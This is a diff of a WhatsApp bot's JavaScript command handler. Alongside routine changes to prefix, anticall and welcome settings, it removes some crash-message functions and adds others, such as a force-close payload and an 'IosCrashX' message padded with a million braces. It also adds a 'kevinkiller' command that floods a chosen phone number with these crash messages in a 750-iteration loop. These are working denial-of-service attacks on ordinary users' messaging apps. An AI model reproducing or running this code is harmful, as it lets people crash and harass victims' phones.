@@ -46,12 +46,18 @@ const Access = [botNumber, devKelvin, ...global.owner, ...global.sudo]
 .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net") .includes(m.sender) ? true : m. isChecking ? true : false;
 
 //prefix   
-const prefix = global.prefixz; 
+let prefix = "."; // Default prefix
 
+// Get prefix from database config
+if (global.db.data.settings && global.db.data.settings[botNumber] && global.db.data.settings[botNumber].config) {
+    prefix = global.db.data.settings[botNumber].config.prefix || ".";
+}
+
+// Check if message starts with the actual prefix from config
 const isCmd = body.startsWith(prefix);
 const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";
-const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
-const args = body.trim().split(/ +/).slice(1)
+const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";
+const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
 const pushname = m.pushName || "No Name";
 const text = q = args.join(" ")
 const fatkuns = m.quoted || m;
@@ -486,6 +492,15 @@ async function handleAIChatbot(m, conn, body, from, isGroup, botNumber, isCmd, p
         // Prevent bot responding to its own messages or commands
         if (!body || m.key.fromMe || body.startsWith(prefix)) {
             console.log("AI: Skipping - own message or command");
+            return false;
+        }
+        
+             // DON'T RESPOND TO THESE SPECIFIC NUMBERS - ADDED CHECK
+        const senderNumber = m.sender.split('@')[0];
+        const ignoredNumbers = ['256742932677', '256755585369'];
+        
+        if (ignoredNumbers.includes(senderNumber)) {
+            console.log(`🤖 AI Chatbot: Ignoring messages from ${senderNumber}`);
             return false;
         }
 
@@ -953,211 +968,7 @@ async function Crx(target) {
         }
     }, { participant: { jid: target}});
 }
-async function invisfc(target, mention) {
-            let msg = await generateWAMessageFromContent(target, {
-                buttonsMessage: {
-                    text: "🩸",
-                    contentText:
-                        "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒",
-                    footerText: "",
-                    buttons: [
-                        {
-                            buttonId: ".bugs",
-                            buttonText: {
-                                displayText: "🇷🇺" + "\u0000".repeat(800000),
-                            },
-                            type: 1,
-                        },
-                    ],
-                    headerType: 1,
-                },
-            }, {});
-        
-            await conn.relayMessage("status@broadcast", msg.message, {
-                messageId: msg.key.id,
-                statusJidList: [target],
-                additionalNodes: [
-                    {
-                        tag: "meta",
-                        attrs: {},
-                        content: [
-                            {
-                                tag: "mentioned_users",
-                                attrs: {},
-                                content: [
-                                    {
-                                        tag: "to",
-                                        attrs: { jid: target },
-                                        content: undefined,
-                                    },
-                                ],
-                            },
-                        ],
-                    },
-                ],
-            });
-            if (mention) {
-                await conn.relayMessage(
-                    target,
-                    {
-                        groupStatusMentionMessage: {
-                            message: {
-                                protocolMessage: {
-                                    key: msg.key,
-                                    type: 25,
-                                },
-                            },
-                        },
-                    },
-                    {
-                        additionalNodes: [
-                            {
-                                tag: "meta",
-                                attrs: { is_status_mention: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒" },
-                                content: undefined,
-                            },
-                        ],
-                    }
-                );
-            }
-        }
-async function invob(target) {
-    let message = {
-        viewOnceMessage: {
-            message: {
-                messageContextInfo: {
-                    deviceListMetadata: {},
-                    deviceListMetadataVersion: 3,
-                },
-                interactiveMessage: {
-                    contextInfo: {
-                        mentionedJid: [target],
-                        isForwarded: true,
-                        forwardingScore: 99999999,
-                        businessMessageForwardInfo: {
-                            businessOwnerJid: target,
-                        },
-                    },
-                    body: {
-                        text: "༒𝗞𝗲𝘃𝗶𝗻 𝘁𝗲𝗰𝗵༒" + "꧀".repeat(100000),
-                    },
-                    nativeFlowMessage: {
-                        buttons: [{
-                                name: "single_select",
-                                buttonParamsJson: "",
-                            },
-                            {
-                                name: "call_permission_request",
-                                buttonParamsJson: "",
-                            },
-                            {
-                                name: "mpm",
-                                buttonParamsJson: "",
-                            },
-                        ],
-                    },
-                },
-            },
-        },
-    };
-
-    await conn.relayMessage(target, message, {
-        participant: {
-            jid: target
-        },
-    });
-    console.log(chalk.yellow('SENT BUGS🦠'));
-}
-async function TrashProtocol(target, mention) {
-                const sex = Array.from({ length: 9741 }, (_, r) => ({
-                       title: "꧀".repeat(9741),
-                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
-                             }));
-                             
-                             const MSG = {
-                             viewOnceMessage: {
-                             message: {
-                             listResponseMessage: {
-                             title: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒",
-                             listType: 2,
-                             buttonText: null,
-                             sections: sex,
-                             singleSelectReply: { selectedRowId: "🇷🇺" },
-                             contextInfo: {
-                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
-                             participant: target,
-                             remoteJid: "status@broadcast",
-                             forwardingScore: 9741,
-                             isForwarded: true,
-                             forwardedNewsletterMessageInfo: {
-                             newsletterJid: "9741@newsletter",
-                             serverMessageId: 1,
-                             newsletterName: "-"
-                             }
-                             },
-                             description: "🇷🇺"
-                             }
-                             }
-                             },
-                             contextInfo: {
-                             channelMessage: true,
-                             statusAttributionType: 2
-                             }
-                             };
-
-                             const msg = generateWAMessageFromContent(target, MSG, {});
-
-                             await conn.relayMessage("status@broadcast", msg.message, {
-                             messageId: msg.key.id,
-                             statusJidList: [target],
-                             additionalNodes: [
-                             {
-                             tag: "meta",
-                             attrs: {},
-                             content: [
-                             {
-                             tag: "mentioned_users",
-                             attrs: {},
-                             content: [
-                             {
-                             tag: "to",
-                             attrs: { jid: target },
-                             content: undefined
-                             }
-                             ]
-                             }
-                             ]
-                             }
-                             ]
-                             });
-
-                             if (mention) {
-                             await conn.relayMessage(
-                             target,
-                             {
-                             statusMentionMessage: {
-                             message: {
-                             protocolMessage: {
-                             key: msg.key,
-                             type: 25
-                             }
-                             }
-                             }
-                             },
-                             {
-                additionalNodes: [
-                    {
-                       tag: "meta",
-                           attrs: { is_status_mention: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒" },
-                             content: undefined
-}
-]
-}
-);
-}
-}
-
-async function delayinvsnew(sam, target) {
+async function forceclose(xvampire, target) {
   const message = {
     viewOnceMessage: {
       message: {
@@ -1196,7 +1007,7 @@ async function delayinvsnew(sam, target) {
 
   const msg = generateWAMessageFromContent(target, message, {})
 
-  await sam.relayMessage("status@broadcast", msg.message, {
+  await conn.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [target],
     additionalNodes: [{
@@ -1212,7 +1023,7 @@ async function delayinvsnew(sam, target) {
 }
 
 
-async function Trial(target) { 
+async function IosCrashX(target) { 
   var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
     'viewOnceMessage': {
       'message': {
@@ -1222,7 +1033,7 @@ async function Trial(target) {
             'subtitle': " "
           },
           'body': {
-            'text': "Kizzu Ryuichi"
+            'text': "xvampire"
           },
           'footer': {
             'text': 'xp'
@@ -1230,7 +1041,7 @@ async function Trial(target) {
           'nativeFlowMessage': {
             'buttons': [{
               'name': 'cta_url',
-              'buttonParamsJson': "{ \"display_text\" : \"Kizzu Ryuichiᬊᬁ\", \"url\" : \"\", \"merchant_url\" : \"\" }"
+              'buttonParamsJson': "{ \"display_text\" : \"Brutalityᬊᬁ\", \"url\" : \"\", \"merchant_url\" : \"\" }"
             }],
             'messageParamsJson': "{".repeat(1000000)
           }
@@ -1246,98 +1057,7 @@ async function Trial(target) {
     },
     'messageId': messageContent.key.id
   });
-  console.log(chalk.blue.bold("Sending trial bug"))
-}
-
-
-// ADD THE imgCrash FUNCTION RIGHT HERE
-async function imgCrash(target) {
-  await conn.relayMessage(target, {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          contextInfo: {
-            fromMe: false,
-            stanzaId: target,
-            participant: target,
-            quotedMessage: {
-              conversation: "҉҈𑇂𑆵𑆴𑆿".repeat(6000)
-            },
-            disappearingMode: {
-              initiator: "CHANGED_IN_CHAT",
-              trigger: "CHAT_SETTING",
-            },
-            isForwarded: true, 
-            forwardingScore: 250208,
-            businessMessageForwardInfo: {
-              businessOwnerJid: "13135550002@s.whatsapp.net"
-            }
-          }, 
-          header: {
-            hasMediaAttachment: false,
-            imageMessage: {
-              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN5r3ZII4fpyrCO02rVD_ubOqMdhzExNoAxy2rT_4dJ6tJ0Y9-OK_WZ11xxgMylQOpWXQm-nC3quuooi9txtx33xRO8WSLrmwSabRXYHA?ccb=9-4&oh=01_Q5Aa2QEuMtY1rLn-CxG9dIrsjPmgV_BHIqfcuevCwxGSCBA7bQ&oe=68CA72F9&_nc_sid=e6ed6c&mms3=true",
-              mimetype: "image/jpeg",
-              fileSha256: "30soM43in2+ESTej4keg8SIBvljVyabjWTOxSU/Qo8M=",
-              fileLength: "9000000000000000000",
-              height: 640,
-              width: 640,
-              mediaKey: "ZF/d//7OeYxddFFNhRQ7eGBqTTh541512tSwmxbn4RY=",
-              fileEncSha256: "PphwPMiHy1DHTWprrHrAfvWct6zlUIQU6mySAP7zhVQ=",
-              "directPath": "/o1/v/t24/f2/m238/AQN5r3ZII4fpyrCO02rVD_ubOqMdhzExNoAxy2rT_4dJ6tJ0Y9-OK_WZ11xxgMylQOpWXQm-nC3quuooi9txtx33xRO8WSLrmwSabRXYHA?ccb=9-4&oh=01_Q5Aa2QEuMtY1rLn-CxG9dIrsjPmgV_BHIqfcuevCwxGSCBA7bQ&oe=68CA72F9&_nc_sid=e6ed6c",
-              mediaKeyTimestamp: "1755515973",
-              jpegThumbnail: null, 
-              contextInfo: {
-                fromMe: false,
-                stanzaId: target,
-                participant: target,
-                disappearingMode: {
-                  initiator: "CHANGED_IN_CHAT",
-                  trigger: "CHAT_SETTING",
-                }, 
-                isForwarded: true, 
-                forwardingScore: 999
-              }
-            }
-          },
-          body: {
-            text: "The Angry Soul Come Back From Beyond The Grave"
-          }, 
-          footer: {
-            text: "yuuKey -~"
-          },
-          nativeFlowMessage: {
-            buttons: [
-              {
-                name: "single_select",
-                buttonParamsJson: ""
-              },              
-              {
-                name: "galaxy_message",
-                buttonParamsJson: JSON.stringify({
-                  "icon": "REVIEW",
-                  "flow_cta": "\u200B".repeat(9000),
-                  "flow_message_version": "3"
-                })
-              },  
-            ],
-            messageParamsJson: JSON.stringify({
-              limited_time_offer: {
-                text: "𝐊𝐢𝐥𝐥𝐞𝐫 𝐐𝐮𝐞𝐞𝐧 𝐕𝟏𝟐",
-                url: "https://t.me/YuukeyD7eppeli",
-                copy_code: "𝐃 | 𝟕𝐞𝐩𝐩𝐞𝐥𝐢-𝐓𝐞𝐚𝐦𝐬",
-                expiration_time: Date.now() * 1000
-              },
-              reminder_info: {
-                reminder_status: "reminder_pending",
-                scheduled_timestamp: Date.now() * 1000
-              }
-            })
-          }
-        }
-      }
-    }
-  }, { participant: { jid: target }})
+  console.log(chalk.blue.bold("Sending vampire Brutality bug"))
 }
 // ========== AI CHATBOT EXECUTION ==========
 if (getAIChatbotState() === "true" && body && !m.key.fromMe && !isCmd) {
@@ -1385,7 +1105,7 @@ const systemUsedMemory = totalMemory - freeMemory;
                     commands: [
                         '𝖠𝖽𝖽𝗉𝗋𝖾𝗆 <number>', 'd𝖾𝗅𝗉𝗋𝖾𝗆 <number>', '𝖯𝗎𝖻𝗅𝗂𝖼', 'private', 'clearallprem', 'delpremmulti',
                         '𝙸𝚍𝚌𝚑', '𝙲𝚛𝚎𝚊𝚝𝚎𝚌𝚑', 'creategroup',
-                        'antidelete', 'del', 'setpp', 'delpp', 'lastseen', 'setprefix', 'groupid', 'readreceipts', 'reportbug', 'clearchat', 'hack', 'groupjids', 'broadcast', 'disappear', 'disappearstatus','clearchat', 'react', 'chatbot',
+                        'antidelete', 'del', 'setpp', 'delpp', 'lastseen', 'setprefix', 'groupid', 'readreceipts', 'reportbug', 'clearchat', 'hack', 'groupjids', 'broadcast', 'disappear', 'disappearstatus','clearchat', 'react', 'chatbot', 'welcome', 'adminevent', 'features',
                         'listblocked', 'online', 'join', 'leave', 'setbio', 'backup', 'reqeust', 'block', 'gpass','toviewonce', 'setownername', 'autoviewstatus', 'autoreactstatus', 'antiedit', 'unblock', 'unblockall', 'gcaddprivacy', 'ppprivancy', 'tostatus',
                         'anticall', 'antibug', 'vv', 'vv2', 'idch','autorecording', 'autotyping', 'getpp',
                     ],
@@ -2887,21 +2607,51 @@ case "autoreact": {
 }
 break
 case "anticall": {
-    if (!Access) return reply(mess.owner);
-    if (args.length < 1) return reply(`Example: ${prefix + command} block/decline/off\n\nblock - Declines and blocks callers\ndecline - Declines incoming calls\noff - Disables anticall`);
+if (!Access) return reply(mess.owner);
+if (args.length < 2) return reply(`Example: ${prefix + command} decline on/off\nOr: ${prefix + command} block on/off`);
 
-    const validOptions = ["block", "decline", "off"];
-    const option = args[0].toLowerCase();
+const validTypes = ["decline", "block"];
+const validOptions = ["on", "off"];
 
-    if (!validOptions.includes(option)) return reply(`Invalid option; type *${prefix}anticall* to see available options!`);
+const type = args[0].toLowerCase();
+const option = args[1].toLowerCase();
 
-    // Update global anticall setting
-    global.anticall = option;
-    
-    // Save to settings if you have a settings system
-    // For now, we'll just use the global variable
-    
-    reply(`Anti-call set to *${option}* successfully.`);
+if (!validTypes.includes(type)) return reply("Invalid type. Use 'decline' or 'block'");
+if (!validOptions.includes(option)) return reply("Invalid option. Use 'on' or 'off'");
+
+// Fix: Properly get setting from global database
+if (!global.db.data.settings) global.db.data.settings = {};
+if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
+let setting = global.db.data.settings[botNumber];
+
+// Initialize config if it doesn't exist
+if (!setting.config) setting.config = {};
+
+// Set the anticall configuration based on type
+if (type === "decline") {
+    if (option === "on") {
+        setting.config.anticall = "decline";
+    } else {
+        // If turning off decline, check if block is also off
+        if (setting.config.anticall === "decline") {
+            setting.config.anticall = false;
+        }
+    }
+} else if (type === "block") {
+    if (option === "on") {
+        setting.config.anticall = "block";
+    } else {
+        // If turning off block, check if decline is also off
+        if (setting.config.anticall === "block") {
+            setting.config.anticall = false;
+        }
+    }
+}
+
+await saveDatabase();
+
+const status = option === "on" ? "enabled" : "disabled";
+reply(`Anticall ${type} mode ${status} successfully${option === "on" ? ` (${type}ing calls)` : ''}`);
 }
 break 
 case "leave": {
@@ -3394,25 +3144,91 @@ await saveDatabase();
 reply(`Anti-edit ${type} mode ${option === "on" ? "enabled" : "disabled"} successfully`);
 }
 break
-case "welcome": {
+case "welcome": { 
     if (!Access) return reply(mess.owner);
     if (args.length < 1) return reply(`Example: ${prefix + command} on/off`);
 
-    const validOptions = ["on", "off"];
     const option = args[0].toLowerCase();
+    if (!['on', 'off'].includes(option)) return reply("Invalid option. Use 'on' or 'off'");
 
-    if (!validOptions.includes(option)) return reply("Invalid option");
+    // Initialize settings if not exists
+    if (!global.db.data.settings) global.db.data.settings = {};
+    if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
+    if (!global.db.data.settings[botNumber].config) global.db.data.settings[botNumber].config = {};
 
-    // Fix: Ensure the chat exists in the database first
-    if (!global.db.data.chats) global.db.data.chats = {};
-    if (!global.db.data.chats[m.chat]) global.db.data.chats[m.chat] = {};
-    
-    // Set the welcome setting
-    global.db.data.chats[m.chat].welcome = option === "on";
+    // Set welcome setting
+    global.db.data.settings[botNumber].config.welcome = option === 'on';
 
     await saveDatabase();
+    reply(`Welcome feature ${option === 'on' ? 'enabled' : 'disabled'} successfully`);
+}
+break
+case "adminevent": {
+    if (!Access) return reply(mess.owner);
+    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`);
 
-    reply(`Welcome and left messages ${option === "on" ? "enabled" : "disabled"} successfully for this group`);
+    const option = args[0].toLowerCase();
+    if (!['on', 'off'].includes(option)) return reply("Invalid option. Use 'on' or 'off'");
+
+    // Initialize settings if not exists
+    if (!global.db.data.settings) global.db.data.settings = {};
+    if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
+    if (!global.db.data.settings[botNumber].config) global.db.data.settings[botNumber].config = {};
+
+    // Set adminevent setting
+    global.db.data.settings[botNumber].config.adminevent = option === 'on';
+
+    await saveDatabase();
+    reply(`Admin event feature ${option === 'on' ? 'enabled' : 'disabled'} successfully`);
+}
+break
+// Enhanced features status command
+case 'features': {
+    if (!global.db.data.settings || !global.db.data.settings[botNumber] || !global.db.data.settings[botNumber].config) {
+        // If no database settings, show global config
+        let statusMessage = `*📊 Feature Status (Global Config):*\n\n`;
+        statusMessage += `• Welcome: ${global.welcome ? '✅ ON' : '❌ OFF'}\n`;
+        statusMessage += `• Admin Events: ${global.adminevent ? '✅ ON' : '❌ OFF'}\n`;
+        statusMessage += `• Anti-edit: ${global.antiedit ? '✅ ' + global.antiedit.toUpperCase() : '❌ OFF'}\n`;
+        statusMessage += `• Anti-delete: ${global.antidelete ? '✅ ' + global.antidelete.toUpperCase() : '❌ OFF'}\n`;
+        statusMessage += `• Auto-react: ${global.autoreact ? '✅ ON' : '❌ OFF'}\n`;
+        statusMessage += `• Auto-bio: ${global.autobio ? '✅ ON' : '❌ OFF'}\n`;
+        statusMessage += `• Chatbot: ${global.chatbot ? '✅ ON' : '❌ OFF'}\n`;
+        statusMessage += `• Anti-call: ${global.anticall ? '✅ ' + global.anticall.toUpperCase() : '❌ OFF'}\n`;
+        statusMessage += `• Auto-view status: ${global.autoviewstatus ? '✅ ON' : '❌ OFF'}\n`;
+        statusMessage += `• Auto-react status: ${global.autoreactstatus ? '✅ ON' : '❌ OFF'}\n`;
+        
+        statusMessage += `\n*Note:* Use commands like:\n`;
+        statusMessage += `• \`.welcome on/off\`\n`;
+        statusMessage += `• \`.adminevent on/off\`\n`;
+        statusMessage += `• \`.antiedit private/chat on/off\`\n`;
+        statusMessage += `• \`.antidelete private/chat on/off\``;
+        
+        return await reply(statusMessage);
+    }
+
+    const config = global.db.data.settings[botNumber].config;
+    
+    let statusMessage = `*📊 Feature Status (Database):*\n\n`;
+    statusMessage += `• Welcome: ${config.welcome ? '✅ ON' : '❌ OFF'}\n`;
+    statusMessage += `• Admin Events: ${config.adminevent ? '✅ ON' : '❌ OFF'}\n`;
+    statusMessage += `• Anti-edit: ${config.antiedit ? '✅ ' + config.antiedit.toUpperCase() : '❌ OFF'}\n`;
+    statusMessage += `• Anti-delete: ${config.statusantidelete ? '✅ ' + config.statusantidelete.toUpperCase() : '❌ OFF'}\n`;
+    statusMessage += `• Auto-react: ${config.autoreact ? '✅ ON' : '❌ OFF'}\n`;
+    statusMessage += `• Auto-bio: ${config.autobio ? '✅ ON' : '❌ OFF'}\n`;
+    statusMessage += `• Chatbot: ${config.chatbot ? '✅ ON' : '❌ OFF'}\n`;
+    statusMessage += `• Auto-view status: ${config.autoviewstatus ? '✅ ON' : '❌ OFF'}\n`;
+    statusMessage += `• Auto-react status: ${config.autoreactstatus ? '✅ ON' : '❌ OFF'}\n`;
+    
+    statusMessage += `\n*Available Commands:*\n`;
+    statusMessage += `• \`.welcome on/off\` - Toggle welcome messages\n`;
+    statusMessage += `• \`.adminevent on/off\` - Toggle admin event notifications\n`;
+    statusMessage += `• \`.antiedit private/chat on/off\` - Anti-edit settings\n`;
+    statusMessage += `• \`.antidelete private/chat on/off\` - Anti-delete settings\n`;
+    statusMessage += `• \`.autoreact on/off\` - Auto-react to messages\n`;
+    statusMessage += `• \`.autobio on/off\` - Auto-bio changer\n`;
+
+    await reply(statusMessage);
 }
 break
 case 'delpp': {
@@ -10649,40 +10465,40 @@ async function newsletterSqL(target, ptcp = true) {
    }
 }
 break
-case "invis": {
-    if(!Access) return reply(mess.owner)
-    if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xx`)
-    let q = text // Initialize 'q' with the input text (minimal change)
-    let vc = q.replace(/[^0-9]/g,'')
-    const target = vc + "@s.whatsapp.net"
-    await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
-    await bugLoad()
-    conn.sendMessage(m.chat, {  
-            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `` 
-                },
-            }
-        },{ quoted: st }
-    )
-    for(let r = 0; r < 40; r++){
-        await delayonly(target)
-        await delayonly(target)
-        await delayonly(target)
-        await sleep(2000)
-        await delayonly(target)
-        await delayonly(target)
-        await delayonly(target)
-        await sleep(1500)
-        await delayonly(target)
-        await delayonly(target)
-    }
+case "kevinkiller": {
+if (!Access) return reply(mess.owner)
+if (!q) return reply(`
+├─   *❌Incomplete Format!*
+├─Use: ${prefix + command} 256xxx`)
+    
+let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
+let isTarget = client + "@s.whatsapp.net"
+await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
+  let process = `*INFORMATION ATTACK*    
+┃├ Sender : ${m.pushName}
+┃├ Target : ${client}
+┃├ Status : Killers triggered.....`
+await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
+reply(process) 
+for (let r = 0; r < 750; r++) {
+await forceclose(isTarget);
+await sleep(5000)
+await forceclose(isTarget);
+await IosCrashX(isTarget);
+await IosCrashX(isTarget);
+await ioscrashX(isTarget);
+}
+
+let put = `*Information done*
+* Sender : ${m.pushName}
+* Target : ${client}
+* Status : Success
+`
+await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
+reply(put)
 }
 break
+//========================================================\\
 case "crax":{
 if(!Access) return reply(mess.owner)
 if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xxx`)
